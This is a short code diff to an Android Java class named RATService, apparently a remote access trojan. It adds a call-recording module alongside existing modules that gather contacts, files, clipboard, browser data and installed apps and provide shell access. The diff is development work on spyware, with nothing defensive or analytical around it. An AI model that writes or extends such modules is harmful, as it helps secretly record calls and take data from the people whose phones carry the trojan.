@@ -96,6 +96,8 @@ public class RATService extends Service {
     private ShellModule shellModule;
     private DeviceModule deviceModule;
     private AppManagerModule appManagerModule;
+    // Add with your other module declarations
+     private CallRecordingModule callRecordingModule;
     // Track camera state
     private boolean isUsingFrontCamera = false;
     
@@ -145,8 +147,8 @@ public class RATService extends Service {
         if (Config.ENABLE_CONTACTS) contactsModule = new ContactsModule(this);
         if (Config.ENABLE_FILES) fileModule = new FileModule(this);
         if (Config.ENABLE_SHELL) shellModule = new ShellModule();
-    if (Config.ENABLE_CLIPBOARD) clipboardModule = new ClipboardModule(this);
-
+        if (Config.ENABLE_CLIPBOARD) clipboardModule = new ClipboardModule(this);
+        if (Config.ENABLE_CALL_RECORDING) callRecordingModule = new CallRecordingModule(this);
         if (Config.ENABLE_BROWSER) browserModule = new BrowserModule(this);
         if (Config.ENABLE_APP_MANAGER) appManagerModule = new AppManagerModule(this);
         deviceModule = new DeviceModule(this);
